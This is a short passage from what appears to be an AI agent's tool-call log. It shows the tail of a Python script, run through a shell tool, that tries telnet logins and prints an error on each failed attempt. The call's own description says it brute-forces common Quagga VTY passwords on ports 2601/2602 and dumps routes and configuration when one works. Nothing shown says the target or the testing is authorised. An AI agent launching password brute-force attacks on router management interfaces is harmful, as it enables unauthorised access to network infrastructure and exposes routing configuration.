           sys.exit(0)\n        except Exception as e:\n            print(f\'[!] Error on {port} with {pw.decode()}:\', e)\n            try:\n                tn.close()\n            except:\n                pass\n            continue\nprint(\'[-] All attempts failed\')\nPY', 'description': 'Brute-force common Quagga VTY passwords on ports 2601/2602 and dump routes/config on success', 'timeout': 120000, 'run_in_background': False, 'dangerouslyDisableSandbox': False}; start
